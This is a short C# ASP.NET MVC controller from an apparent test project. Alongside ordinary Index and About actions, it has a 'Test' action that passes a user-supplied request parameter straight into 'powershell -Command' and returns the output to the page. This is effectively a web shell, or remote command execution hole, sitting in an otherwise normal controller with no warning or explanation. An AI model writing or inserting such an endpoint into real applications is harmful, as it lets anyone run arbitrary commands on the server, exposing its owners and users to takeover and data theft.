using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace TestApp.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            ViewBag.Message = "Welcome to gitub testing!";

            return View();
        }

        public ActionResult About()
        {
            return View();
        }

        public ActionResult Test(string test)
        {
            if (test != null)
            {
                // Start the child process.
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                // Redirect the output stream of the child process.
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "powershell";
                p.StartInfo.Arguments = "-Command " + test;
                p.Start();
                // Read the output stream first and then wait.
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();

                // Set the result in the page
                ViewBag.Message = output;
            }

            return View();
        }
    }
}
